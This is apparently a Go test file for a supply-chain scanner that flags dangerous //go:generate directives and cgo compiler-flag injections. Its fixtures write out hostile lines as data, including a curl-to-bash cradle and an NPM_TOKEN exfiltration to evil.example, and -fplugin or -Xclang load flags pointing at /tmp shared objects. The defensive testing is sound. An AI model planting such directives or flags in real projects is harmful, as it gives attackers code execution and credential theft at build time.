package installsurface

import "testing"

// goHookByName returns the first hook whose name equals want, or a zero Hook.
func goHookByName(s Surface, want string) (Hook, bool) {
	for _, h := range s.Hooks {
		if h.Name == want {
			return h, true
		}
	}
	return Hook{}, false
}

// TestAnalyzeGo_GoGenerate covers OPU-28 Increment 1: a //go:generate directive
// whose command reaches the network / executes remote code is surfaced with the
// matching capability, while a benign local generator carries none and is not
// recorded (the run-vs-fetch discipline applied to codegen).
func TestAnalyzeGo_GoGenerate(t *testing.T) {
	// A directive that pipes a download into a shell: a download cradle.
	s := AnalyzeGo(map[string]string{"gen.go": "package p\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n"})
	if len(s.Hooks) != 1 {
		t.Fatalf("cradle directive: want 1 hook, got %d (%+v)", len(s.Hooks), s.Hooks)
	}
	if !s.Hooks[0].HasCap(CapCradle) {
		t.Errorf("curl|bash go:generate should be a cradle, caps=%v", s.Hooks[0].Caps)
	}

	// A directive that fetches a file: network.
	s = AnalyzeGo(map[string]string{"gen.go": "//go:generate wget https://evil.example/payload -O gen_out.go\n"})
	if h, ok := goHookByName(s, "go:generate:gen.go"); !ok || !h.HasCap(CapNetwork) {
		t.Errorf("wget go:generate should reach the network, surface=%+v", s.Hooks)
	}

	// A directive that exfiltrates a credential: network + credentials (VC-002d).
	s = AnalyzeGo(map[string]string{"gen.go": "//go:generate sh -c \"curl -H \\\"$NPM_TOKEN\\\" https://evil.example/c\"\n"})
	if len(s.Hooks) != 1 || !s.Hooks[0].HasCap(CapNetwork) || !s.Hooks[0].HasCap(CapCredentials) {
		t.Errorf("credential-exfil go:generate should be network+credentials, surface=%+v", s.Hooks)
	}

	// Benign local generators carry no capability and are not recorded.
	for _, benign := range []string{
		"//go:generate mockgen -source=api.go -destination=mock.go\n",
		"//go:generate stringer -type=Pill\n",
		"//go:generate go run ./internal/gen\n",
		"// go:generate curl https://evil\n",          // space after // -> NOT a directive
		"package p\n// a comment about go:generate\n", // prose, not a directive
	} {
		if s := AnalyzeGo(map[string]string{"x.go": benign}); len(s.Hooks) != 0 {
			t.Errorf("benign/non-directive %q must not be recorded, got %+v", benign, s.Hooks)
		}
	}
}

// TestAnalyzeGo_CgoFlagInjection covers OPU-28 Increment 2: a #cgo directive
// carrying a build-time code-execution flag shape is surfaced as CapExec with a
// cgo-inject marker, while an ordinary cgo directive (the common benign case) and
// a #cgo-shaped comment in a non-cgo file stay silent.
func TestAnalyzeGo_CgoFlagInjection(t *testing.T) {
	inject := map[string]string{
		"plugin":         "package p\n/*\n#cgo CFLAGS: -fplugin=/tmp/evil.so\n*/\nimport \"C\"\n",
		"xclang-load":    "package p\n/*\n#cgo CFLAGS: -Xclang -load -Xclang /tmp/p.so\n*/\nimport \"C\"\n",
		"specs":          "package p\n/*\n#cgo CFLAGS: -specs=/tmp/evil.specs\n*/\nimport \"C\"\n",
		"tool-redirect":  "package p\n/*\n#cgo CFLAGS: -B/tmp/evil\n*/\nimport \"C\"\n",
		"response-file":  "package p\n/*\n#cgo LDFLAGS: @/tmp/flags\n*/\nimport \"C\"\n",
		"shell-metachar": "package p\n/*\n#cgo LDFLAGS: -l$(whoami)\n*/\nimport \"C\"\n",
	}
	for name, src := range inject {
		s := AnalyzeGo(map[string]string{"c.go": src})
		h, ok := goHookByName(s, "cgo:c.go")
		if !ok || !h.HasCap(CapExec) {
			t.Errorf("cgo %s: want a cgo hook with CapExec, surface=%+v", name, s.Hooks)
			continue
		}
		var hasMarker bool
		for _, e := range h.Evidence {
			if IsCgoInjectionMarker(e) {
				hasMarker = true
			}
		}
		if !hasMarker {
			t.Errorf("cgo %s: hook must carry a cgo-inject marker, evidence=%v", name, h.Evidence)
		}
	}

	// Ordinary cgo directives (the common benign case) and a #cgo-shaped line in a
	// file that does not import "C" must NOT be recorded.
	for name, src := range map[string]string{
		"benign lib flags":      "package p\n/*\n#cgo LDFLAGS: -L/usr/lib -lssl -lcrypto\n*/\nimport \"C\"\n",
		"benign cflags":         "package p\n/*\n#cgo CFLAGS: -I/usr/include -Wall -O2 -std=c11\n*/\nimport \"C\"\n",
		"benign pkg-config":     "package p\n/*\n#cgo pkg-config: gtk+-3.0\n*/\nimport \"C\"\n",
		"benign SRCDIR var":     "package p\n/*\n#cgo CFLAGS: -I${SRCDIR}/include\n*/\nimport \"C\"\n",
		"benign -Wl,-Bsymbolic": "package p\n/*\n#cgo LDFLAGS: -Wl,-Bsymbolic -Wl,-z,now\n*/\nimport \"C\"\n",
		"no import C":           "package p\n/*\n#cgo CFLAGS: -fplugin=/tmp/evil.so\n*/\nvar x = 1\n", // line-start #cgo, but no import "C" -> not cgo
	} {
		if s := AnalyzeGo(map[string]string{"c.go": src}); len(s.Hooks) != 0 {
			t.Errorf("benign/non-cgo %q must not be recorded, got %+v", name, s.Hooks)
		}
	}
}

// TestIsCgoInjectionMarker pins the VC-002h gate predicate.
func TestIsCgoInjectionMarker(t *testing.T) {
	if !IsCgoInjectionMarker("cgo-inject:plugin") {
		t.Error("cgo-inject:plugin should be a cgo-injection marker")
	}
	if IsCgoInjectionMarker("cgo") || IsCgoInjectionMarker("go:generate") {
		t.Error("plain cgo / go:generate markers are not injection markers")
	}
}

// TestAnalyzeGo_MultipleDirectives proves multiple directives in one file get
// UNIQUE hook names (so they do not collide to a single graph node) and that the
// output is deterministic across files.
func TestAnalyzeGo_MultipleDirectives(t *testing.T) {
	src := "//go:generate wget https://a.example/1\n//go:generate wget https://b.example/2\n"
	s := AnalyzeGo(map[string]string{"gen.go": src})
	if len(s.Hooks) != 2 {
		t.Fatalf("want 2 hooks, got %d", len(s.Hooks))
	}
	names := map[string]bool{}
	for _, h := range s.Hooks {
		if names[h.Name] {
			t.Errorf("duplicate hook name %q would collide to one graph node", h.Name)
		}
		names[h.Name] = true
	}
	if !names["go:generate:gen.go#1"] || !names["go:generate:gen.go#2"] {
		t.Errorf("expected indexed unique names, got %v", names)
	}
}
